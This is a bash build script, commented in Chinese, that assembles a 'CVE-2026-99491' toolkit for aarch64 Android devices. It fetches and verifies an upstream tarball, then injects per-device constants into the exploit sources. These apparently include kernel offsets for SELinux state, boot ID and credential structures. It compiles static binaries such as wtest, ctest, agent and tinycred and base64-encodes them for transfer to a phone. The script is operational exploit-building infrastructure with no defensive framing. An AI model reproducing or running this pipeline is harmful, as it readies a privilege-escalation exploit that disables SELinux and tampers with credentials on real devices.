#!/usr/bin/env bash
# 构建 CVE-2026-99491 工具集（上游 GPL-2.0 源码 + 本机常量）。
#
# 用法：tools/build_cve99491.sh <输出目录>
#
# 需要：curl、tar、zig（或 zig 在 PATH）。产物为 aarch64-linux-musl 静态件。
set -euo pipefail

OUT=${1:?用法: $0 <输出目录>}
ROOT=$(cd "$(dirname "$0")/.." && pwd)
LOCK="$ROOT/tools/cve99491.lock.properties"
CACHE=${CVE99491_CACHE:-$PWD/.cve99491-cache}

get() { sed -n "s/^$1=//p" "$LOCK" | head -1; }

REPO=$(get repo); COMMIT=$(get commit); URL=$(get url)
WANT_SIZE=$(get size); WANT_SHA=$(get sha256)
LINK_ADD_WORKER=$(get link_add_worker)
LINK_SELINUX=$(get link_selinux)
LINK_BOOTID=$(get link_bootid)
CRED_SITE=$(get cred_site_low21)
BLOB_A=$(get blob_site_a)
BLOB_B=$(get blob_site_b)

for v in REPO COMMIT URL WANT_SIZE WANT_SHA LINK_ADD_WORKER LINK_SELINUX LINK_BOOTID CRED_SITE; do
  if [ -z "${!v}" ]; then
    echo "::error::lock 文件缺少 $v"
    exit 1
  fi
done

mkdir -p "$OUT" "$CACHE"
TAR="$CACHE/99491-$COMMIT.tar.gz"
SRC="$CACHE/src-$COMMIT"

if [ ! -d "$SRC/tools" ]; then
  if [ ! -f "$TAR" ]; then
    echo "下载 $URL"
    curl -fsSL "$URL" -o "$TAR"
  fi
  got_size=$(stat -c%s "$TAR")
  got_sha=$(sha256sum "$TAR" | awk '{print $1}')
  if [ "$got_size" != "$WANT_SIZE" ] || [ "$got_sha" != "$WANT_SHA" ]; then
    echo "::error::上游 tarball 校验失败：size=$got_size sha256=$got_sha"
    exit 1
  fi
  echo "tarball 校验通过（$got_size 字节）"
  rm -rf "$SRC"
  mkdir -p "$SRC"
  tar -xzf "$TAR" -C "$SRC" --strip-components=1
fi

T="$SRC/tools"
[ -f "$T/ctest.c" ] || { echo "::error::tarball 结构异常：缺 tools/ctest.c"; exit 1; }

# —— 常量注入 ——
patch_macro() {
  local file=$1 name=$2 value=$3
  if ! grep -qE "^#define[[:space:]]+$name[[:space:]]" "$file"; then
    echo "::error::$file 里找不到 #define $name"
    exit 1
  fi
  sed -i -E "s|^#define[[:space:]]+$name[[:space:]]+.*|#define $name ${value}ULL|" "$file"
  grep -E "^#define[[:space:]]+$name[[:space:]]" "$file" | sed 's/^/  /'
}

echo "注入本机常量："
patch_macro "$T/wtest.c" LINK_ADD_WORKER "$LINK_ADD_WORKER"
patch_macro "$T/wtest.c" LINK_SELINUX_STATE "$LINK_SELINUX"
patch_macro "$T/wtest.c" LINK_BOOTID "$LINK_BOOTID"
patch_macro "$T/ctest.c" CRED_SITE_LOW21 "$CRED_SITE"
if [ "$BLOB_A" != "0x0" ]; then
  patch_macro "$T/ctest.c" BLOB_SITE_A "$BLOB_A"
  patch_macro "$T/ctest.c" BLOB_SITE_B "$BLOB_B"
else
  echo "  (BLOB_SITE_* 未测出，保持上游值；cred 发现阶段先用 site_probe 实测)"
fi

# —— Android system_properties 垫片 ——
# wtest（可选 --stoprisk）与 agent 都直接调用 bionic 的两个符号；
# musl 没有它们，这里提供空实现，只影响"通过属性触发 ctl.stop"这类可选路径。
mkdir -p "$T/compat/sys"
cat > "$T/compat/sys/system_properties.h" <<'EOF'
#ifndef CVE99491_COMPAT_SYSTEM_PROPERTIES_H
#define CVE99491_COMPAT_SYSTEM_PROPERTIES_H
#define PROP_VALUE_MAX 92
int __system_property_get(const char *key, char *value);
int __system_property_set(const char *key, const char *value);
#endif
EOF
cat > "$T/compat_sp.c" <<'EOF'
/* 非 bionic 目标下的空实现。 */
#define PROP_VALUE_MAX 92
int __system_property_get(const char *key, char *value)
{
	(void)key;
	if (value)
		value[0] = 0;
	return 0;
}
int __system_property_set(const char *key, const char *value)
{
	(void)key; (void)value;
	return -1;
}
EOF

CC=${CC:-zig cc}
CFLAGS=(-target aarch64-linux-musl -std=gnu11 -O2 -static -s -pthread
        -ffunction-sections -fdata-sections -Wl,--gc-sections
        -fno-asynchronous-unwind-tables -fno-unwind-tables
        -I"$T" -I"$T/compat")

build() {
  local name=$1; shift
  echo "== $name"
  # 统一附带 system_properties 垫片：未被引用的对象不会进入最终镜像。
  # shellcheck disable=SC2068
  $CC "${CFLAGS[@]}" "$@" "$T/compat_sp.c" -o "$OUT/$name"
  ls -l "$OUT/$name"
}

build site_probe "$ROOT/plant/cve99491/site_probe.c"
build wtest      "$T/wtest.c"
build ctest      "$T/ctest.c"
build agent      "$T/agent.c"
build capdump    "$T/capdump.c"
build evread     "$T/evread.c"
build hold       "$T/hold.c"
build tinycred   "$T/tinycred.c"

{
  echo "upstream=$REPO@$COMMIT"
  echo "link_add_worker=$LINK_ADD_WORKER"
  echo "link_selinux=$LINK_SELINUX"
  echo "link_bootid=$LINK_BOOTID"
  echo "cred_site_low21=$CRED_SITE"
  echo "blob_site_a=$BLOB_A"
  echo "blob_site_b=$BLOB_B"
  echo "built_at=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
  for f in "$OUT"/*; do
    case "$f" in *.b64|*.txt) continue;; esac
    echo "$(basename "$f") $(stat -c%s "$f") $(sha256sum "$f" | awk '{print $1}')"
  done
} > "$OUT/BUILDINFO.txt"
cat "$OUT/BUILDINFO.txt"

# 手机端拿不到 CI artifact，用 base64 走仓库
for f in "$OUT"/*; do
  case "$f" in *.b64|*.txt) continue;; esac
  base64 -w0 "$f" > "$OUT/$(basename "$f").b64"
done
echo "已生成 $(ls "$OUT"/*.b64 | wc -l) 个 base64 文件"
